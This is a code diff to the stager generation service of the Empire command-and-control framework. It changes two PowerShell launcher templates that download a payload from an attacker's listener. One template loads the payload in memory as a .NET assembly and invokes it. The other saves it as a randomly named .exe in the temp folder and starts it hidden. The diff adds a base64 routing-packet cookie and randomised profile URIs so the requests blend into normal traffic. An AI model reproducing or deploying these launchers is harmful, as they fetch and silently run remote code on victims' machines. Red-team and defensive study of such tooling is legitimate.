@@ -2,6 +2,7 @@ import base64
 import errno
 import logging
 import os
+import random
 import shutil
 import typing
 from itertools import cycle
@@ -14,7 +15,7 @@ except ModuleNotFoundError:
 
 import macholib.MachO
 
-from empire.server.common import helpers
+from empire.server.common import helpers, packets
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util
@@ -201,10 +202,24 @@ class StagerGenerationService:
         else:
             hop = ""
         launcher_front = listener.options["Launcher"]["Value"]
+        request_uri = self._get_request_uri(listener)
+        staging_key = listener.options["StagingKey"]["Value"]
+        cookie_name = listener.options["Cookie"]["Value"]
+        routing_packet = packets.build_routing_packet(
+            staging_key,
+            sessionID="00000000",
+            language=language.upper(),
+            meta="STAGE0",
+            additional="None",
+            encData="",
+        )
+        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
+        stage0_url = self._build_stage0_url(listener.host_address, request_uri, hop)
 
         launcher = f"""
         $wc=New-Object System.Net.WebClient;
-        $bytes=$wc.DownloadData("{listener.host_address}download/{language}/{hop}");
+        $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
+        $bytes=$wc.DownloadData("{stage0_url}");
         $assembly=[Reflection.Assembly]::load($bytes);
         $assembly.EntryPoint.Invoke($null,$null);
         """
@@ -245,12 +260,26 @@ class StagerGenerationService:
         else:
             hop = ""
         launcher_front = listener.options["Launcher"]["Value"]
+        request_uri = self._get_request_uri(listener)
+        staging_key = listener.options["StagingKey"]["Value"]
+        cookie_name = listener.options["Cookie"]["Value"]
+        routing_packet = packets.build_routing_packet(
+            staging_key,
+            sessionID="00000000",
+            language=language.upper(),
+            meta="STAGE0",
+            additional="None",
+            encData="",
+        )
+        b64_routing_packet = base64.b64encode(routing_packet).decode("UTF-8")
+        stage0_url = self._build_stage0_url(listener.host_address, request_uri, hop)
 
         launcher = f"""
             # Create a temp file path
             $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
             $wc = New-Object System.Net.WebClient;
-            $url = "{listener.host_address}download/{language}/{hop}";
+            $wc.Headers.Add("Cookie","{cookie_name}={b64_routing_packet}");
+            $url = "{stage0_url}";
             $wc.DownloadFile($url, $tempFilePath);
             Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
         """
@@ -270,6 +299,20 @@ class StagerGenerationService:
             return helpers.powershell_launcher(launcher, launcher_front)
 
         return launcher
+
+    def _get_request_uri(self, listener) -> str:
+        profile = listener.options["DefaultProfile"]["Value"]
+        uris = [uri.strip() for uri in profile.split("|")[0].split(",") if uri.strip()]
+        request_uri = random.choice(uris) if uris else "/"
+        if not request_uri.startswith("/"):
+            request_uri = f"/{request_uri}"
+        return request_uri
+
+    def _build_stage0_url(self, host_address: str, request_uri: str, hop: str) -> str:
+        base = f"{host_address}{request_uri.lstrip('/')}"
+        if hop:
+            return f"{base}?hop={hop}"
+        return base
 
     def generate_python_exe(
         self, python_code, dot_net_version="net40", obfuscate=False
